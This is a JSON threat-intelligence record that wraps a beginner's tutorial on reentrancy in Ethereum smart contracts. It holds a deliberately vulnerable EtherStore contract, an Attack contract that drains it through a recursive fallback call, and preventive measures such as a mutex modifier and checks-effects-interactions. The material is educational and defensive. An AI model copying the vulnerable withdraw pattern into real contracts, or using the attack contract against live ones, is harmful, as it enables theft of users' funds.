{
    "threat_intelligence": {
        "url": "https://dapp-world.com/smartbook/understanding-reentrancy-attack-qhm1",
        "timestamp": "2016-06-17 00:00:00",
        "original_content": "\n\nReentrancy is one of the most common vulnerabilities in Ethereum smart contract programming. It allows attackers to repeatedly call functions in a contract before the first invocation finishes execution. This can lead to unintended draining of funds from the contract.\n\n\nIn this beginner's guide, we will understand what a reentrancy attack is, see an example attack contract exploiting this vulnerability, learn how to prevent reentrancy in Solidity, and best practices to write secure Ethereum dApps.\n\n\nReal World Example - The DAO Hack\n\n\nThe most famous reentrancy attack is The DAO hack in 2016, where 3.6 million Ether worth $70 million at that time was stolen.\n\n\nThe DAO contract had a vulnerable `withdraw()` function that allowed attackers to recursively call the function and drain Ether stored in the contract.\n\n\nSample Vulnerable Contract\n\n\nHere is a simple Solidity contract vulnerable to reentrancy:\n\n\n// Vulnerable Contract\ncontract EtherStore {\n\n  mapping(address => uint) public balances;\n\n  function deposit() public payable {\n    balances[msg.sender] += msg.value;\n  }\n\n  function withdraw() public {\n    uint bal = balances[msg.sender];\n    require(bal > 0);\n\n    (bool sent, ) = msg.sender.call{value: bal}(\"\");\n    require(sent, \"Failed to send Ether\");\n\n    balances[msg.sender] = 0;\n  }\n\n  function getBalance() public view returns (uint) {\n    return address(this).balance;\n  }\n\n}\n\ncontract Attack {\n\n  EtherStore public etherStore;\n\n  constructor(address _etherStoreAddress) {\n    etherStore = EtherStore(_etherStoreAddress);\n  }\n\n  fallback() external payable {\n    if(address(etherStore).balance >= 1 ether) {\n      etherStore.withdraw();\n    }\n  }\n\n  function attack() external payable {\n    require(msg.value >= 1 ether);\n    etherStore.deposit{value: 1 ether}();\n    etherStore.withdraw();\n  }\n\n  function getBalance() public view returns (uint) {\n    return address(this).balance;\n  }\n\n\nThis EtherStore contract keeps a record of balances in a mapping. The `withdraw()` function first checks the balance, then sends Ether and finally sets the balance to 0.\n\n\nThe Attack contract calls `etherStore.withdraw()` in the fallback function, allowing it to call withdraw again before the first call completes.\n\n\nHow a Reentrancy Attack Works\n\n\nA reentrancy attack works as follows:\n\n\n1. The attacker contract calls `EtherStore.withdraw()`\n\u00a0 \u00a0\u00a0\n2. `EtherStore` checks balances and then sends Ether to attacker\n\u00a0 \u00a0\u00a0\n3. Before `withdraw()` finishes, the attacker contract calls `withdraw()` again via the fallback function\n\u00a0 \u00a0\u00a0\n4. `EtherStore` still has the same balances, so sends Ether again\n\u00a0 \u00a0\u00a0\n5. This repeats until the contract's Ether balance becomes 0\n\u00a0 \u00a0\u00a0\n\n\nPreventing Reentrancy in Smart Contracts\n\n\nHere are some best practices to prevent reentrancy in Solidity smart contracts:\n\n\nUse Locking\n\n\nUse a `reentrancyLock` boolean and check it before state changes:\n\n\ncontract EtherStore {\n\n  bool internal lock; \n\n  modifier noReentrant() {\n    require(!lock, \"No reentrancy\");\n    lock = true;\n    _;\n    lock = false;\n  }\n\n  function withdraw() public noReentrant {\n    // ...\n  }\n\n}\n\n\n\nThe `noReentrant` modifier prevents reentrancy by using a mutex.\n\n\nOther Ways to Prevent Reentrancy\n\n\nOther ways to prevent reentrancy include:\n\n\n* Use the Checks-Effects-Interactions pattern - check conditions first, change state next, then make external calls\n\u00a0 \u00a0\u00a0\n* Use pull over push payments - let users withdraw to their account rather than pushing funds to them\n\u00a0 \u00a0\u00a0\n* Limit the amount withdrawn per transaction\n\u00a0 \u00a0\u00a0\n* Use reentrancy guard libraries like OpenZeppelin's ReentrancyGuard\n\u00a0 \u00a0\u00a0\n\n\nConclusion\n\n\nReentrancy is a major security vulnerability in Ethereum smart contract programming. By learning secure coding practices like proper state management and reentrancy locks, these attacks can be prevented. Thoroughly reviewing and auditing smart contract code before deploying to mainnet is essential.\n\n\nGITHUB LINK\n\n\nSmart Contracts Security Github Repo"
    }
}